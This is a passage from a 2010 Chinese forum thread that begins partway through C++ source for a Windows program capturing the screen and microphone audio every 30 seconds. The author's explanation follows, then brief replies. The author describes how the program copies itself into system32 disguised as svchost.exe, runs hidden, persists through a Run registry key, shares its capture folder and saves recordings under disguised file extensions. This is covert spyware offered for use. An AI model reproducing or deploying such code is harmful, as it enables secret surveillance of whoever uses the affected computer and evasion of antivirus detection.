&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; BitBlt( hMemDC, 0, 0, dwScrX, dwScrY, hScrDC, 0, 0, SRCCOPY );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Bitmap *pBmp = Bitmap::FromHBITMAP( hMemBmp, NULL );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // 保存文件到指定目录。<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pBmp-&gt;Save( strOutFile, &amp;encoderClsid, NULL );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; delete pBmp;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // 开始录音<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; waveInPrepareHeader( hwi, &amp;whdr, sizeof(whdr) );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; waveInAddBuffer( hwi, &amp;whdr, sizeof(whdr) );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; waveInStart( hwi );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Sleep( dwGapTime * 1000 );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; waveInStop( hwi );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // 写入wav文件<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD dwData, dwRes;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; GetLocalTime( &amp;st );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; strOutFile.Format( L&quot;%s\\%02d%02d_%02d%02d%02d.daw&quot;,<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; szPath, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; HANDLE hFile = CreateFileW( strOutFile, GENERIC_WRITE, 0,<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteFile( hFile, &quot;RIFF&quot;, 4, &amp;dwRes, NULL);<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwData = whdr.dwBufferLength + 18 + 20;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteFile( hFile, &amp;dwData, 4, &amp;dwRes, NULL );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteFile( hFile, &quot;WAVEfmt &quot;, 8, &amp;dwRes, NULL );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwData = 18;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteFile( hFile, &amp;dwData, 4, &amp;dwRes, NULL );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteFile( hFile, &amp;wf, sizeof(wf), &amp;dwRes, NULL);<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteFile( hFile, &quot;data&quot;, 4, &amp;dwRes, NULL );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwData = whdr.dwBufferLength;<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteFile( hFile, &amp;dwData, 4, &amp;dwRes, NULL );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteFile( hFile, whdr.lpData, dwData, &amp;dwRes, NULL );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SetEndOfFile( hFile );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CloseHandle( hFile );<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; waveInReset( hwi );<br />
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; waveInUnprepareHeader( hwi, &amp;whdr, sizeof(whdr) );<br />
&nbsp; &nbsp; &nbsp; &nbsp; }<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 关闭音频设备<br />
&nbsp; &nbsp; &nbsp; &nbsp; waveInClose( hwi );<br />
//&nbsp; &nbsp; &nbsp; &nbsp; 释放内存<br />
&nbsp; &nbsp; &nbsp; &nbsp; delete[] whdr.lpData;<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 释放内存DC和位图<br />
&nbsp; &nbsp; &nbsp; &nbsp; SelectObject( hMemDC, hOldBmp );<br />
&nbsp; &nbsp; &nbsp; &nbsp; DeleteObject( hMemBmp );<br />
&nbsp; &nbsp; &nbsp; &nbsp; DeleteDC( hMemDC );<br />
&nbsp; &nbsp; &nbsp; &nbsp; DeleteDC( hScrDC );<br />
&nbsp; &nbsp; &nbsp; &nbsp; // 关闭GDI+<br />
&nbsp; &nbsp; &nbsp; &nbsp; GdiplusShutdown( gdiplusToken );<br />
&nbsp; &nbsp; &nbsp; &nbsp; return 0;<br />
}</code></div>这个程序是在自己的电脑上用的，显然需要在杀软上给这个程序足够的权限。<br />
<br />
该程序双击就自动运行。首先建立一个c:\\windows\\system32\\capture目录，并设为共享，然后将自身复制进这个文件夹，改名为 svchost.exe。随后启动复本，自身结束。也就是说，双击运行后原程序文件就可以删除了，程序会在后台自动运行。<br />
<br />
然后程序会添加开机启动项，开机就自动运行。如需取消，请删除键值：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft \Windows\CurrentVersion\Run\SilentRec<br />
<br />
程序会在c:\\windows\\system\\capture目录中每隔30秒保存一次屏幕为dai文件，录制30秒的音频，保存为daw文件。 文件名的格式是：月日_时分秒。要查看屏幕图像文件，把扩展名dai改为jpg，听录音，把扩展名daw改成wav。<br />
<br />
结束程序请按Win+PrtSc键。<br />
<br />
任何问题请参考源代码或加我的GTalk，地址上面给了。<br />
<br />
[<i> 本帖最后由 devymex 于 2010-2-11 00:15 编辑 </i>]</div>

							
							
							
							
															<div id="post_rate_div_472571"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo472571_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=12101" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=472571&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 472571)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_0"></div>				</div>
			</td>
		</tr>
		</table>
		</div><div class="ad_column" id="ad_interthread"><a href="/viewthread.php?tid=54699" target="_blank" style="color:red;">1984bbs是一个非营利项目，它需要您的捐助！</font></a>		</div>
	<div class="mainbox viewthread">
			<table id="pid473050" summary="pid473050" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=6906" target="_blank" id="userinfo473050" class="dropmenu" onmouseover="showMenu(this.id)">jaychu128</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=6906">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=6906&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_1" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum473050" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid473050', '话题链接已经复制到剪贴板')">2楼</strong>
													<em onclick="$('postmessage_473050').className='t_bigfont'">大</em>							<em onclick="$('postmessage_473050').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_473050').className='t_smallfont'">小</em>												发表于 2010-2-8 21:36&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=6906" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_1"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_1"></div><div id="ad_thread4_1"></div>
						
						
																											<div id="postmessage_473050" class="t_msgfont">Idle = =</div>

							
							
							
							
															<div id="post_rate_div_473050"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo473050_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=6906" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=473050&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 473050)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_1"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid473107" summary="pid473107" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=300" target="_blank" id="userinfo473107" class="dropmenu" onmouseover="showMenu(this.id)">rationalcrow</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">拆呐拆呐不拆怎么成china</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=300">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=300&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_2" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum473107" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid473107', '话题链接已经复制到剪贴板')">3楼</strong>
													<em onclick="$('postmessage_473107').className='t_bigfont'">大</em>							<em onclick="$('postmessage_473107').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_473107').className='t_smallfont'">小</em>												发表于 2010-2-8 21:57&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=300" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_2"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_2"></div><div id="ad_thread4_2"></div>
						
						
																											<div id="postmessage_473107" class="t_msgfont">建议放google code</div>

							
							
							
							
															<div id="post_rate_div_473107"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo473107_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=300" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=473107&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 473107)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_2"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid473282" summary="pid473282" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=3308" target="_blank" id="userinfo473282" class="dropmenu" onmouseover="showMenu(this.id)">天衢居士</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">一小撮各種不明真相</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=3308">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=3308&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_3" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum473282" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid473282', '话题链接已经复制到剪贴板')">4楼</strong>
													<em onclick="$('postmessage_473282').className='t_bigfont'">大</em>							<em onclick="$('postmessage_473282').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_473282').className='t_smallfont'">小</em>												发表于 2010-2-8 23:48&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=3308" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_3"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_3"></div><div id="ad_thread4_3"></div>
						
						
																											<div id="postmessage_473282" class="t_msgfont">非专业人士飞过。。。不懂。。。</div>

							
							
							
							
															<div id="post_rate_div_473282"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo473282_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=3308" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=473282&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 473282)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_3"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid474435" summary="pid474435" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=4292" target="_blank" id="userinfo474435" class="dropmenu" onmouseover="showMenu(this.id)">02304H</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">10001100000100B</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=4292">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=4292&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_4" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum474435" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid474435', '话题链接已经复制到剪贴板')">5楼</strong>
													<em onclick="$('postmessage_474435').className='t_bigfont'">大</em>							<em onclick="$('postmessage_474435').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_474435').className='t_smallfont'">小</em>												发表于 2010-2-9 20:54&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=4292" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_4"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_4"></div><div id="ad_thread4_4"></div>
						
						
																											<div id="postmessage_474435" class="t_msgfont">动了注册表杀软显然会报警……</div>

							
							
							
							
															<div id="post_rate_div_474435"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo474435_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=4292" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=474435&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 474435)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_4"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid475067" summary="pid475067" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=12101" target="_blank" id="userinfo475067" class="dropmenu" onmouseover="showMenu(this.id)">devymex</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Devymex真身，Twitter: @devymex</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=12101">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=12101&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_5" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum475067" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid475067', '话题链接已经复制到剪贴板')">6楼</strong>
													<em onclick="$('postmessage_475067').className='t_bigfont'">大</em>							<em onclick="$('postmessage_475067').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_475067').className='t_smallfont'">小</em>												发表于 2010-2-10 12:07&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=12101" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_5"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_5"></div><div id="ad_thread4_5"></div>
						
						
																											<div id="postmessage_475067" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>10293817</i> 于 2010-2-9 20:54 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=474435&amp;ptid=37210" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
动了注册表杀软显然会报警…… </blockquote></div>给自己人用的，显然需要在杀软上给这个程序足够的权限。<br />
<br />
这个回复就不再解释，全放到贴子下面了。<br />
<br />
[<i> 本帖最后由 devymex 于 2010-2-10 16:22 编辑 </i>]</div>

							
							
							
							
															<div id="post_rate_div_475067"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo475067_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=12101" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=475067&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 475067)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_5"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid475083" summary="pid475083" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=8531" target="_blank" id="userinfo475083" class="dropmenu" onmouseover="showMenu(this.id)">止痛药</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">苦力难寻</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=8531">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=8531&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_6" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum475083" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid475083', '话题链接已经复制到剪贴板')">7楼</strong>
													<em onclick="$('postmessage_475083').className='t_bigfont'">大</em>							<em onclick="$('postmessage_475083').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_475083').className='t_smallfont'">小</em>												发表于 2010-2-10 12:14&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=8531" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_6"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_6"></div><div id="ad_thread4_6"></div>
						
						
																											<div id="postmessage_475083" class="t_msgfont">好邪恶啊~哈哈~~~</div>

							
							
							
							
															<div id="post_rate_div_475083"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo475083_menu" style="display: none;">
										<div class="imicons">
												<a href="http://wpa.qq.com/msgrd?V=1&amp;Uin=335802811&amp;Site=1984bbs.com&amp;Menu=yes" target="_blank"><img src="images/default/qq.gif" alt="QQ" /></a>																							</div>
										<dl></dl>
										<p><a href="space.php?uid=8531" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=475083&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 475083)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_6"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid475220" summary="pid475220" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=12216" target="_blank" id="userinfo475220" class="dropmenu" onmouseover="showMenu(this.id)">fuckmylife</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">双腿夹着灵魂赶路匆忙</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=12216">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=12216&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_7" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum475220" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid475220', '话题链接已经复制到剪贴板')">8楼</strong>
													<em onclick="$('postmessage_475220').className='t_bigfont'">大</em>							<em onclick="$('postmessage_475220').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_475220').className='t_smallfont'">小</em>												发表于 2010-2-10 13:44&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=12216" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_7"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_7"></div><div id="ad_thread4_7"></div>
						
						
																											<div id="postmessage_475220" class="t_msgfont">说老实话，我一直挺崇拜程序员的</div>

							
							
							
							
															<div id="post_rate_div_475220"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo475220_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=12216" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=475220&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 475220)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_7"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid475263" summary="pid475263" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=4454" target="_blank" id="userinfo475263" class="dropmenu" onmouseover="showMenu(this.id)">baobao</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=4454">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=4454&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_8" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum475263" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid475263', '话题链接已经复制到剪贴板')">9楼</strong>
													<em onclick="$('postmessage_475263').className='t_bigfont'">大</em>							<em onclick="$('postmessage_475263').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_475263').className='t_smallfont'">小</em>												发表于 2010-2-10 14:08&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=4454" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_8"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_8"></div><div id="ad_thread4_8"></div>
						
						
																											<div id="postmessage_475263" class="t_msgfont">不错</div>

							
							
							
							
															<div id="post_rate_div_475263"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo475263_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=4454" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=475263&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 475263)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_8"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid475318" summary="pid475318" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=12005" target="_blank" id="userinfo475318" class="dropmenu" onmouseover="showMenu(this.id)">zszheng</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=12005">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=12005&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_9" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum475318" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid475318', '话题链接已经复制到剪贴板')">10楼</strong>
													<em onclick="$('postmessage_475318').className='t_bigfont'">大</em>							<em onclick="$('postmessage_475318').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_475318').className='t_smallfont'">小</em>												发表于 2010-2-10 14:44&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=12005" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_9"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_9"></div><div id="ad_thread4_9"></div>
						
						
																											<div id="postmessage_475318" class="t_msgfont">看代码有困难！不能直接给出可执行的文件吗？</div>

							
							
							
							
															<div id="post_rate_div_475318"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo475318_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=12005" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=475318&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 475318)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_9"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid475374" summary="pid475374" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=10473" target="_blank" id="userinfo475374" class="dropmenu" onmouseover="showMenu(this.id)">龙飞</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">西安</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=10473">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=10473&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_10" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum475374" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid475374', '话题链接已经复制到剪贴板')">11楼</strong>
													<em onclick="$('postmessage_475374').className='t_bigfont'">大</em>							<em onclick="$('postmessage_475374').className='t_msgfont'">中</em>
